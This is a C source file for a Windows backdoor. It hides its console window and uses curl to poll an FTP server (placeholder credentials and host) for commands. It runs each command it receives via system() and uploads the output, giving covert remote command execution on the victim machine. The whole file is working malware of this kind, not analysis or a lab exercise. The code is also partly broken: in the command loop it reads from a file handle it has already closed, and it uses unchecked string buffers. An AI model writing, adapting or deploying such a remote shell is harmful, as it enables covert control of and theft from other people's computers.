#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

void HideConsole()
{
    HWND hide;
    AllocConsole();
    hide=FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hide,0);
}

int main ()
{
    HideConsole();
    
    FILE *init;
    char input_init[200]="curl -T ", output_init[200]="curl -T ", filename[50], usrname[25],input_filename[50],output_filename[50];
    char check[25]="Connection established",res[25];
    char checkcmd[100]="curl ftp://username:password@domainname/";
    char checkinpt[100]="curl ftp://username:password@domainname/";
    char input_path[200]="C:\\PerfLogs\\",output_path[200]="C:\\PerfLogs\\";
    char cmd[1000],cmdout[1050];
    DWORD buffersize=25;
    

    itoa(GetCurrentProcessId(),filename,10);           //get pid and sessionusername and put them in a string with this format : 'pid'_'sessionusername'
    GetUserNameA(usrname,&buffersize);
    strcat(filename,"_");
    strcat(filename,usrname);


    sprintf(input_filename, "%s.inpt", filename);   //store the input file name into a string

    sprintf(output_filename, "%s.outp", filename);  //store the output file name into a string

    strcat(input_path,input_filename);           //path of the files
    strcat(output_path,output_filename);

    strcat(input_init,input_path);
    strcat(input_init, " ftp://username:password@domainname");     //prepare the shell command to upload the input file, this input file will contain the shell command to be executed

    strcat(output_init,output_path);
    strcat(output_init, " ftp://username:password@domainname");    //prepare the shell command to upload the output file, this output file will contain the output of the remote shell commands

    strcat(checkinpt,input_filename);               //shell command that is going to download the file that contain the commands to be executed
    strcat(checkinpt,">");
    strcat(checkinpt,input_path);

    strcat(checkcmd,output_filename);               //command to check if the files were succesfully sent
    strcat(checkcmd, ">C:\\PerfLogs\\networkcheck.txt");


    init=fopen(input_path,"w");    //create the input file
    fputs("null",init);
    fclose(init);

    init=fopen(output_path,"w");    //create the output file
    fputs("Connection established",init);
    fclose(init);


    do
    {
        system(output_init);
        system(input_init);
        Sleep(100);
        system(checkcmd);
        init=fopen("C:\\PerfLogs\\networkcheck.txt","r");
        fgets(res,23,init);

    }while( strcmp(res,check)!=0 );        //loop to check if the server got the files

    system("del C:\\PerfLogs\\networkcheck.txt");
    fclose(init);

    while (1)
    {
        Sleep(100);
        system(checkinpt);
        fopen(input_path,"r");
        fgets(cmd,1000,init);
        fclose(init);
        if ( strcmp( cmd , "null" )!=0 )
        {
            strcpy(cmdout,cmd);
            strcat(cmdout,">");
            strcat(cmdout,output_path);
            system(cmdout);
            system(output_init);
            init=fopen(input_path,"w");
            fputs("null",init);
            fclose(init);
            system(input_init);
        }
    }
   return 0; 
}
